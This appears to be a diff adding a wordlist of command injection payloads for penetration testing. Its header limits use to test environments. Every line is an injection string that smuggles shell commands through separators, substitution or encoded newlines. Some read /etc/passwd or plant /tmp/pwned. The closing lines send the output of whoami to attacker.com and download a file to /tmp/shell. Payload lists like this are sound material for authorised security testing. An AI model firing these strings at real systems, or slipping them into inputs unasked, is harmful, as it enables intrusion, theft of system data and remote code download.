@@ -1,0 +1,52 @@
+# Command Injection Test Payloads
+# Use with caution - only against test environments
+# Each line is a separate payload
+
+; ls -la
+| ls -la
+& ls -la
+&& ls -la
+|| ls -la
+`ls -la`
+$(ls -la)
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; whoami
+| whoami
+`whoami`
+$(whoami)
+; id
+| id
+`id`
+$(id)
+; uname -a
+| uname -a
+`uname -a`
+$(uname -a)
+; pwd
+| pwd
+; echo test
+| echo test
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+%0als
+%0a cat /etc/passwd
+\n ls -la
+\nid
+;id;
+;id|
+|id;
+|id|
+$(touch /tmp/pwned)
+`touch /tmp/pwned`
+;touch /tmp/pwned
+|touch /tmp/pwned
+& ping -c 10 attacker.com &
+; curl http://attacker.com/$(whoami)
+| wget http://attacker.com -O /tmp/shell
